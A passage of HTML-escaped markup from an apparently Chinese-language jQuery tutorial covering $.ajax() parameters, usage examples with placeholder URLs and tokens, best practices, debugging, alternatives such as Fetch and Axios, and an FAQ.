&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ajax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;配置参数说明&#34;&gt;配置参数说明
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;参数&lt;/th&gt;
          &lt;th&gt;默认值&lt;/th&gt;
          &lt;th&gt;可选值&lt;/th&gt;
          &lt;th&gt;说明&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;accepts&lt;/td&gt;
          &lt;td&gt;{&amp;quot;&lt;em&gt;&amp;quot;: &amp;ldquo;&lt;/em&gt;/*&amp;rdquo;}&lt;/td&gt;
          &lt;td&gt;任何MIME类型&lt;/td&gt;
          &lt;td&gt;指定请求头Accept字段&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;beforeSend&lt;/td&gt;
          &lt;td&gt;null&lt;/td&gt;
          &lt;td&gt;函数&lt;/td&gt;
          &lt;td&gt;发送请求前的回调函数&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;cache&lt;/td&gt;
          &lt;td&gt;true&lt;/td&gt;
          &lt;td&gt;布尔值&lt;/td&gt;
          &lt;td&gt;是否允许浏览器缓存&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;contentType&lt;/td&gt;
          &lt;td&gt;&amp;ldquo;application/x-www-form-urlencoded&amp;rdquo;&lt;/td&gt;
          &lt;td&gt;MIME类型&lt;/td&gt;
          &lt;td&gt;发送数据的格式&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;data&lt;/td&gt;
          &lt;td&gt;null&lt;/td&gt;
          &lt;td&gt;对象/字符串/数组&lt;/td&gt;
          &lt;td&gt;要发送到服务器的数据&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;dataType&lt;/td&gt;
          &lt;td&gt;&amp;ldquo;text&amp;rdquo;&lt;/td&gt;
          &lt;td&gt;&amp;ldquo;xml&amp;rdquo;/&amp;ldquo;json&amp;rdquo;/等&lt;/td&gt;
          &lt;td&gt;预期返回的数据类型&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;error&lt;/td&gt;
          &lt;td&gt;null&lt;/td&gt;
          &lt;td&gt;函数&lt;/td&gt;
          &lt;td&gt;请求失败时的回调&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;headers&lt;/td&gt;
          &lt;td&gt;null&lt;/td&gt;
          &lt;td&gt;对象&lt;/td&gt;
          &lt;td&gt;自定义请求头&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;success&lt;/td&gt;
          &lt;td&gt;null&lt;/td&gt;
          &lt;td&gt;函数&lt;/td&gt;
          &lt;td&gt;请求成功时的回调&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;timeout&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;毫秒数&lt;/td&gt;
          &lt;td&gt;请求超时时间&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;type&lt;/td&gt;
          &lt;td&gt;&amp;ldquo;GET&amp;rdquo;&lt;/td&gt;
          &lt;td&gt;&amp;ldquo;GET&amp;rdquo;/&amp;ldquo;POST&amp;quot;等&lt;/td&gt;
          &lt;td&gt;HTTP请求方法&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;实际应用示例&#34;&gt;实际应用示例
&lt;/h2&gt;&lt;h3 id=&#34;基础用法&#34;&gt;基础用法
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ajax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/api/data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;成功获取数据:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;xhr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;请求失败:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;带认证头的请求&#34;&gt;带认证头的请求
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ajax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/secure-api&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Authorization&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Bearer YOUR_TOKEN&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 处理数据
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;实时搜索实现&#34;&gt;实时搜索实现
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#search-input&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;input&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ajax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/search&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;val&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;// 更新搜索结果
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;最佳实践&#34;&gt;最佳实践
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;安全性&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;始终使用HTTPS&lt;/li&gt;
&lt;li&gt;验证和净化所有输入&lt;/li&gt;
&lt;li&gt;实施CSRF保护&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;性能优化&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;合理使用缓存&lt;/li&gt;
&lt;li&gt;减少数据传输量&lt;/li&gt;
&lt;li&gt;批量处理请求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;错误处理&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;实现指数退避重试机制&lt;/li&gt;
&lt;li&gt;提供用户友好的错误信息&lt;/li&gt;
&lt;li&gt;记录错误日志&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;调试技巧&#34;&gt;调试技巧
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;使用浏览器开发者工具的Network面板检查请求/响应&lt;/li&gt;
&lt;li&gt;添加全局错误处理：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ajaxError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;xhr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;AJAX错误:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;settings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;验证响应数据格式是否符合预期&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;替代方案比较&#34;&gt;替代方案比较
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;方案&lt;/th&gt;
          &lt;th&gt;优点&lt;/th&gt;
          &lt;th&gt;缺点&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;$.ajax()&lt;/td&gt;
          &lt;td&gt;功能全面，兼容性好&lt;/td&gt;
          &lt;td&gt;依赖jQuery&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Fetch API&lt;/td&gt;
          &lt;td&gt;现代，基于Promise&lt;/td&gt;
          &lt;td&gt;需要polyfill支持旧浏览器&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Axios&lt;/td&gt;
          &lt;td&gt;拦截器支持，自动JSON转换&lt;/td&gt;
          &lt;td&gt;需要额外引入&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;版本兼容性说明&#34;&gt;版本兼容性说明
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;jQuery 3.0+已弃用同步请求(async:false)&lt;/li&gt;
&lt;li&gt;JSONP支持已过时，推荐使用CORS&lt;/li&gt;
&lt;li&gt;部分回调语法已被Promise风格替代&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;常见问题解答&#34;&gt;常见问题解答
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Q: 如何处理AJAX错误？&lt;/strong&gt;
A: 使用error回调或全局ajaxError事件捕获错误，并根据状态码采取不同措施。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Q: 可以取消AJAX请求吗？&lt;/strong&gt;
A: 可以，通过jqXHR对象的abort()方法：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;xhr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ajax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(...);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;xhr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;abort&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 取消请求
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Q: 如何发送JSON数据？&lt;/strong&gt;
A: 设置contentType为&amp;quot;application/json&amp;quot;并使用JSON.stringify():&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
